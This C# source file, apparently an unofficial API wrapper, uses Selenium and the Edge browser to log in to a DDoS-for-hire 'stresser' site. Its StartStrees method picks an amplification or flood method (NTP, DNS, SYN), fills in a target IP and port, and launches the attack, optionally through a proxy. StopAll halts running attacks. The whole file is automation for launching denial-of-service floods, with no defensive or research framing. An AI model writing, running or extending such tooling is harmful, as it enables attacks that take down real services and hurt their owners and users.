using Microsoft.Edge.SeleniumTools;
using OpenQA.Selenium;
using OpenQA.Selenium.Support.UI;
using System;
using System.Threading;

namespace StressersAPI
{
    public class InstantStresser
    {
        public void StopAll(string login, string password, Proxy proxy = null)
        {
            EdgeDriverService driverService = EdgeDriverService.CreateChromiumService();
            EdgeOptions options = new EdgeOptions();
            //driverService.HideCommandPromptWindow = true;
            options.UseChromium = true;
            if (proxy != null)
            {
                options.Proxy = proxy;
            }
            //options.AddArgument("headless");
            //options.AddArgument("disable-gpu");
            EdgeDriver driver = new EdgeDriver(driverService, options, new TimeSpan(0, 2, 0));
            driver.Navigate().GoToUrl("https://instant-stresser.com/login");

            /* Авторизация */
            var loginelemt = driver.FindElementByXPath("/html[1]/body[1]/main[1]/div[1]/div[1]/div[2]/div[1]/div[1]/div[2]/form[1]/div[1]/input[1]");
            loginelemt.SendKeys(login);
            var passwordelemt = driver.FindElementByXPath("/html[1]/body[1]/main[1]/div[1]/div[1]/div[2]/div[1]/div[1]/div[2]/form[1]/div[2]/input[1]");
            passwordelemt.SendKeys(password);

            var buttonelemt = driver.FindElementByXPath("/html[1]/body[1]/main[1]/div[1]/div[1]/div[2]/div[1]/div[1]/div[2]/form[1]/button[1]");
            buttonelemt.Click();
            Thread.Sleep(250);
            driver.Navigate().GoToUrl("https://instant-stresser.com/hub");
            try
            {
                var closeallelemt = driver.FindElementByXPath("//button[@class='btn btn-outline-danger']");
                closeallelemt.Click();
            }
            catch { }
        }
        public string StartStrees(string ip, int port, Method method, string login, string password, Proxy proxy = null)
        {
            EdgeDriverService driverService = EdgeDriverService.CreateChromiumService();
            EdgeOptions options = new EdgeOptions();
            //driverService.HideCommandPromptWindow = true;
            options.UseChromium = true;
            if (proxy != null)
            {
                options.Proxy = proxy;
            }
            //options.AddArgument("headless");
            //options.AddArgument("disable-gpu");
            EdgeDriver driver = new EdgeDriver(driverService, options, new TimeSpan(0, 2, 0));
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            driver.Navigate().GoToUrl("https://instant-stresser.com/login");

            /* Авторизация */
            var loginelemt = driver.FindElementByXPath("/html[1]/body[1]/main[1]/div[1]/div[1]/div[2]/div[1]/div[1]/div[2]/form[1]/div[1]/input[1]");
            loginelemt.SendKeys(login);
            var passwordelemt = driver.FindElementByXPath("/html[1]/body[1]/main[1]/div[1]/div[1]/div[2]/div[1]/div[1]/div[2]/form[1]/div[2]/input[1]");
            passwordelemt.SendKeys(password);

            var buttonelemt = driver.FindElementByXPath("//button[@class='btn btn-primary btn-block mt-3 mb-3']");
            buttonelemt.Click();
            Thread.Sleep(250);
            driver.Navigate().GoToUrl("https://instant-stresser.com/hub");
            try
            {
                driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(1);
                var closeallelemt = driver.FindElementByXPath("//button[@class='btn btn-outline-danger btn-sm']");
                closeallelemt.Click();
            }
            catch { }
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(4);
            try
            {
                var closeallelemt = driver.FindElementByXPath("//button[@class='btn btn-outline-danger']");
                closeallelemt.Click();
            } catch { }
            var methodelemt = driver.FindElementByXPath("//select[@id='method']");
            methodelemt.Click();
            var selectElement = new SelectElement(methodelemt);
            if (method == Method.NTP)
            {
                selectElement.SelectByText("NTP");
            }
            else if (method == Method.DNS)
            {
                selectElement.SelectByText("DNS");
            }
            else if (method == Method.SYN)
            {
                selectElement.SelectByText("SYN");
            }
            else if (method == Method.ASK)
            {
                selectElement.SelectByText("ASK");
            }
            var ipelemt = driver.FindElementByXPath("//input[@id='host']");
            ipelemt.SendKeys(ip);
            var portelemt = driver.FindElementByXPath("//input[@id='port']");
            portelemt.SendKeys(port.ToString());
            var startelemt = driver.FindElementByXPath("//button[@name='startAttack']");
            startelemt.Click();
            Thread.Sleep(50);
            try
            {
                var toast = driver.FindElementByXPath("//div[@class='toast-message']");
                string st = toast.Text;
                driver.Quit();
                return st;
            }
            catch { return string.Empty; }
        }
        public enum Method
        {
            CLDAP,
            NTP,
            DNS,
            SYN,
            ASK,
        }
    }
}
